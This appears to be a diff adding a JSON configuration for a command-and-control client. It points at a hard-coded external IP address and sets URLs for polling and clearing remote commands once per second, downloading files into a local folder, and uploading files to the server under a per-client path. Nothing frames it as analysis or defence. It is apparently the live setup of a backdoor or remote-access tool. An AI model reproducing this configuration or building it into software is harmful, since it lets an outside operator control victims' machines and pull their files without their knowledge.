@@ -1,0 +1,19 @@
+﻿{
+  "KEYCMD": "cmd",
+  "HOST": "http://195.133.146.10/",
+
+  "PageToLoad": "dl.php?file=",
+  "ShowShell": null,
+  "TargetFolder": "DOWNLOAD",
+
+  "UrlsToLoad": [
+    "%HOST%cmdv1/_common",
+    "%HOST%cmdv1/%KEYCMD%"
+  ],
+  "URLCmd": "%HOST%cmdv1/getandclear.php?p=%KEYCMD%/",
+  "URLLog": null,
+  "Interval": "1000",
+  "UploadUrl": "%HOST%upload.php",
+  "UploadPath": "cmdv1/%KEYCMD%/upload/"
+
+}
